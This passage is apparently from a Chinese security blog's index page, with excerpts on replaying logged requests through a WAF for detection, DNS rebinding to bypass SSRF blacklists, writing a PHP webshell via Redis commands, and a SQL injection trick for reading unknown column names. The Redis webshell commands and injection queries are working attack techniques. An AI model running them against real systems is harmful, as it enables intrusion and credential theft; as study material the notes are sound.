	# 			rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
	# 			print &quot;Curl %s&quot; % self.request
	# 			print rep.status_code
	# 	else:
	# 		#留着写POST请求判断
	# 		pass


	def run(self):
		while 1:
			try:
				request &#x3D; self.queue.get()
				path &#x3D; request[0]
				param &#x3D; request[1]
				method &#x3D; request[2]
				if method &#x3D;&#x3D; &#39;GET&#39;:
					if not param:
						pass
					else:
						rep &#x3D; requests.get(&quot;http:&#x2F;&#x2F;xxxxx:9999&quot; + path + &#39;?&#39; + param + &quot;union select&quot;)
				#else  写POST
				print &quot;Get %s&quot; % request
				print rep.status_code
			except Exception as e:
				raise e

q &#x3D; Queue()
pt &#x3D; Producter(q)
ce &#x3D; Consumer(q)
ce.start()
pt.start()
pt.join()
ce.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码应该还有点问题，先记录下大概的流程：</p>
<p>使用: <code>packetbeat</code>在A服务器抓包，格式化之后把数据发送到B服务器，存储在elk里面，然后B服务器画图对这些请求进行分析，比如某个接口报警之类的。</p>
<p>这个时候在B服务器设置一个naxsi防火墙代理，然后把es里面的输出取出来，再发送一遍给B。经过测试，虽然这样子请求大部分都是404，但是如果请求中存在恶意payload，防火墙会记录日志。（所以这里的规则要设置的特别严格，严格到每个请求都不放过）</p>
<p>上面的脚本就是在B防火墙的转发脚本demo，测试为GET请求，因为POST请求的body没有存储到es里面，脚本的大概思路是这样的：</p>
<pre class="line-numbers language-none"><code class="language-none">因为es里面存储的数据包是这样的格式: packet-[year]-[days]
所以先得到今天的日期，随便选100条，记录最新的时间戳，此时初始化完成。

下面的请求都是基于这个时间戳来的，每隔10s，在这个时间戳的基础上，轮询请求一次es，然后组装起来发送到B服务器。
记录下每次请求的最新日期，然后请求这个index，因为packet的格式: packet-[year]-[days],所以记录下每次请求的最新时间，格式化抓取最新的时间:

latest_time &#x3D; res2[&#39;hits&#39;][&#39;hits&#39;][0][&#39;_source&#39;][&#39;@timestamp&#39;]

当es的存储数据按照大于某个时间点去筛选的时候，只会出现匹配的时间条数，所以可以把请求的size设置得大一点
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>暂时的问题：</p>
	
	</div>
  <a type="button" href="/2017/12/11/producer-consumer.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/06/dns-rebinding.html" >DNS Rebinding</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-06  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>最后的链接是关于dns rebinding的文章，这里主要做一个笔记：</p>
<p>先盗用ricterz.me的博客一个图<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
<p>在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。</p>
<ol>
<li>获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。</li>
<li>比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问</li>
</ol>
<p>使用DNS Rebinding的会有这样的攻击效果:</p>
<ol>
<li>获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面</li>
<li>放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。</li>
</ol>
<p>DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。</p>
<p>所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。</p>
<p>根据goychou大神的脚本，测试以下步骤：</p>
<ul>
<li>添加一个A记录，域名是ns.xyz.pw，指向服务器A</li>
<li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li>
</ul>
	

	</div>
  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>最后的链接是关于dns rebinding的文章，这里主要做一个笔记：</p>
<p>先盗用ricterz.me的博客一个图<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
<p>在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。</p>
<ol>
<li>获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。</li>
<li>比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问</li>
</ol>
<p>使用DNS Rebinding的会有这样的攻击效果:</p>
<ol>
<li>获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面</li>
<li>放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。</li>
</ol>
<p>DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。</p>
<p>所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。</p>
<p>根据goychou大神的脚本，测试以下步骤：</p>
<ul>
<li>添加一个A记录，域名是ns.xyz.pw，指向服务器A</li>
<li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li>
</ul>
	
	</div>
  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/12/05/redis-crontab.html" >redis hacker</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-12-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>Orange在BH大会的paper上面这么说的:</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
  	Elastic, CouchDB, Mongodb, Docker
  
  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
<ul>
<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
<li>然后再正常使用redis来攻击</li>
</ul>
<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
redis-cli -h 127.0.0.1 config set dbfilename shell.php
redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后得到的数据流如下：</p>
<pre class="line-numbers language-none"><code class="language-none">*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$8\r
&#x2F;var&#x2F;www\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$3\r
web\r
$18\r
&lt;?php phpinfo();?&gt;\r
*1\r
$4\r
save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>Orange在BH大会的paper上面这么说的:</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
  	Elastic, CouchDB, Mongodb, Docker
  
  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Ph在他<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <a target="_blank" rel="noopener" href="https://redis.io/topics/protocol">https://redis.io/topics/protocol</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br>在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：</p>
<ul>
<li>redis-server启动的时候监听6378端口 <code>redis-server /etc/redis/redis.conf --port 6378</code></li>
<li>运行<code>socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378</code></li>
<li>然后再正常使用redis来攻击</li>
</ul>
<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 config set dir &#x2F;var&#x2F;www
redis-cli -h 127.0.0.1 config set dbfilename shell.php
redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo();?&gt;&quot;
redis-cli -h 127.0.0.1 save <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后得到的数据流如下：</p>
<pre class="line-numbers language-none"><code class="language-none">*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$8\r
&#x2F;var&#x2F;www\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$3\r
web\r
$18\r
&lt;?php phpinfo();?&gt;\r
*1\r
$4\r
save\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/12/05/redis-crontab.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/11/28/sql-bypass-unknown.html" >SQL注入绕过未知字段名的技巧</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-11-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/</a> </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> id    <span class="token operator">|</span> username <span class="token operator">|</span> password                         <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span>     <span class="token operator">|</span> admin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+----------+----------------------------------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




	

	</div>
  <a type="button" href="/2017/11/28/sql-bypass-unknown.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL注入之过滤列名get数据/</a> </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+---+---+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>      <span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span> admin  <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">|</span> admin2 <span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">3</span> <span class="token operator">|</span> admin3 <span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">---+--------+----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e<span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token operator">|</span> <span class="token number">3</span>                                <span class="token operator">|</span>
<span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>ca99696b5a896d067a0fa9dc61a6 <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">7195</span>C                            <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------+</span>
<span class="token number">4</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> e<span class="token punctuation">.</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>e <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">3</span>     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token operator">|</span> <span class="token number">7195</span>C <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

